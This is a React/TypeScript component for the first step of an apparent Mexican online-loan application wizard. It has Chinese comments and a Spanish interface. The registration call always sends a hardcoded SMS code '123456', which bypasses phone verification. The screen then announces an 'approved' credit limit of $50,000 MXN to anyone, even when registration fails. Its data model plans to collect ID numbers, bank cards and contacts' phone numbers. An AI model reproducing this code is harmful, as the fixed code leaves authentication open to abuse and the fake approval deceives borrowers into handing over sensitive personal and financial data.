import React, { useState, useEffect } from 'react';
import { useTranslation } from 'react-i18next';
import { getApiUrl } from '../config/api';
import { httpClient, checkBrowserCompatibility } from '../utils/httpClient';
import { safeStorage, safeDateParse, arrayCompat, smoothScroll } from '../utils/browserCompat';

import { 
  trackLoanApplicationStart, 
  trackLoanApplicationComplete,
  trackFileUpload 
} from '../utils/analytics';

interface LoanApplication {
  id?: string;
  sessionId?: string;
  step: number;
  phone?: string;
  isGuest?: boolean;
  userId?: string;
  // 第2步：身份信息
  idNumber?: string;
  realName?: string;
  // 第4步：联系人信息
  contact1Name?: string;
  contact1Phone?: string;
  contact2Name?: string;
  contact2Phone?: string;
  // 第7步：银行卡
  bankCardNumber?: string;
  // 第11步：提现信息
  withdrawalAmount?: number;
  installmentPeriod?: number;
}

interface StepProps {
  data: LoanApplication;
  onUpdate: (data: Partial<LoanApplication>) => void;
  onNext: () => void;
  onBack: () => void;
  updateApplicationStep?: (step: number, stepData: any) => Promise<void>;
}

// 第1步：用户注册（简化版）
const Step1UserRegistration: React.FC<StepProps> = ({ data, onUpdate, onNext, updateApplicationStep }) => {
  const { t } = useTranslation();
  const [phone, setPhone] = useState(data.phone || '');
  const [countryCode, setCountryCode] = useState('+52');
  const [showApprovedAmount, setShowApprovedAmount] = useState(false);
  const [isRegistering, setIsRegistering] = useState(false);

  const countryCodes = [
    { code: '+52', name: 'México', flag: '🇲🇽' },
    { code: '+1', name: 'Estados Unidos', flag: '🇺🇸' },
    { code: '+54', name: 'Argentina', flag: '🇦🇷' },
    { code: '+55', name: 'Brasil', flag: '🇧🇷' },
    { code: '+56', name: 'Chile', flag: '🇨🇱' },
    { code: '+57', name: 'Colombia', flag: '🇨🇴' },
  ];

  const handleCheckEligibility = async () => {
    if (!phone) {
      alert(t('errors.phoneRequired'));
      return;
    }

    const fullPhone = countryCode + phone;
    setIsRegistering(true);

    try {
      // 直接进行用户注册（无需验证码）
      console.log('📱 Registering user with phone:', fullPhone);
      
      // 调用verify-sms接口进行用户注册，使用固定验证码
      const result = await httpClient.postJson('/api/auth/verify-sms', {
        phone: fullPhone,
        code: '123456', // 使用固定验证码
        applicationId: data.id
      }) as { 
        success: boolean; 
        error?: string; 
        user?: { id: string; phone: string; phone_verified: boolean };
        token?: string;
        applicationId?: string;
      };

      console.log('✅ User registration result:', result);

      if (result.success) {
        // 显示审批金额
        setShowApprovedAmount(true);
        
        // 用户已注册，申请已转换
        const updatedData = {
          phone: fullPhone,
          isGuest: false, // 现在是注册用户
          id: data.id,
          userId: result.user?.id
        };
        onUpdate(updatedData);

        if (updateApplicationStep) {
          await updateApplicationStep(1, { 
            phone: fullPhone, 
            registered: true,
            verified: true,
            userId: result.user?.id
          });
        }

        console.log('✅ User registered successfully');
      } else {
        alert(result.error || '注册失败，请重试');
      }
    } catch (error) {
      console.error('❌ Failed to register user:', error);
      // 如果注册失败，仍然显示审批金额，但保持访客状态
      setShowApprovedAmount(true);
      const updatedData = {
        phone: fullPhone,
        isGuest: true,
        id: data.id
      };
      onUpdate(updatedData);
      
      if (updateApplicationStep) {
        await updateApplicationStep(1, { 
          phone: fullPhone, 
          registered: false,
          verified: false
        });
      }
    } finally {
      setIsRegistering(false);
    }
  };

  const handleContinue = () => {
    onNext();
  };

  return (
    <div className="space-y-4 sm:space-y-6">
      <div>
        <h3 className="text-xl sm:text-2xl font-bold mb-2">¡Préstamos con Interés Bajo!</h3>
        <p className="text-gray-600 text-sm sm:text-base">Ingresa tu número de teléfono para ver tu límite de crédito aprobado</p>
      </div>

      <div className="space-y-4">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">
            {t('loanWizard.step1.phoneLabel')}
          </label>
          <div className="flex max-w-full">
            <select
              value={countryCode}
              onChange={(e) => setCountryCode(e.target.value)}
              className="px-2 sm:px-3 py-3 border border-gray-300 border-r-0 rounded-l-lg bg-gray-50 focus:ring-2 focus:ring-blue-500 focus:border-transparent"
              disabled={showApprovedAmount}
              style={{ minWidth: "80px", maxWidth: "100px" }}
            >
              {countryCodes.map((country) => (
                <option key={country.code} value={country.code}>
                  {country.flag} {country.code}
                </option>
              ))}
            </select>
            <input
              type="tel"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              placeholder={t('loanWizard.step1.phonePlaceholder')}
              className="flex-1 px-2 sm:px-4 py-3 border border-gray-300 rounded-r-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
              disabled={showApprovedAmount}
              style={{ minWidth: "0" }}
            />
          </div>
        </div>

        {!showApprovedAmount ? (
          <button
            onClick={handleCheckEligibility}
            disabled={!phone || isRegistering}
            className="w-full py-3 bg-green-600 text-white rounded-lg hover:bg-green-700 disabled:opacity-50 disabled:cursor-not-allowed font-medium"
          >
            {isRegistering ? (
              <div className="flex items-center justify-center">
                <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
                Procesando...
              </div>
            ) : (
              'Ver Mi Límite de Crédito'
            )}
          </button>
        ) : (
          <div className="space-y-4">
            <div className="bg-green-50 border border-green-200 rounded-lg p-4 sm:p-6 text-center">
              <h4 className="font-semibold text-green-800 mb-1 sm:mb-2">¡Felicidades! Tu límite de crédito es:</h4>
              <div className="text-2xl sm:text-3xl font-bold text-green-600 mb-1 sm:mb-2">$50,000 MXN</div>
              <p className="text-xs sm:text-sm text-green-700">Préstamo con interés bajo disponible ahora</p>
              {data.userId && (
                <p className="text-xs text-green-600 mt-2">✅ Usuario registrado exitosamente</p>
              )}
            </div>
            
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 sm:p-4">
              <h4 className="font-medium text-blue-800 mb-1 sm:mb-2">Beneficios de tu préstamo:</h4>
              <ul className="text-xs sm:text-sm text-blue-700 space-y-1">
                <li>• Tasa de interés baja: 15% OFF (promoción por tiempo limitado)</li>
                <li>• Hasta 100,000 pesos de crédito</li>
                <li>• Sin comisión de procesamiento</li>
                <li>• Pago anticipado permitido sin penalización</li>
              </ul>
            </div>

            <button
              onClick={handleContinue}
              className="w-full py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 font-medium"
            >
              Continuar con mi Solicitud
            </button>
          </div>
        )}
      </div>
    </div>
  );
};

export default Step1UserRegistration;